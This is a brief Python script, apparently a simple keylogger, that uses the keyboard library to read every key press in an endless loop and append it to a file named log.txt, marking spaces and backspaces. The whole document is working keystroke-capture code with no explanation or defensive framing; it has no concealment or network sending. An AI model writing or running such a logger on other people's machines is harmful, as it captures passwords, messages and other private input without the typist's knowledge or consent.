import keyboard
import os
import time
a = keyboard.read_key()
while True: 
    if a != "space" and a != "backspace":
        with open("log.txt", "a") as b:
            b.write(a)
    elif a == "space":
        with open("log.txt", "a") as b:
            b.write(" ")
    else:
        with open("log.txt", "a") as b:
            b.write("~")
    a = keyboard.read_key()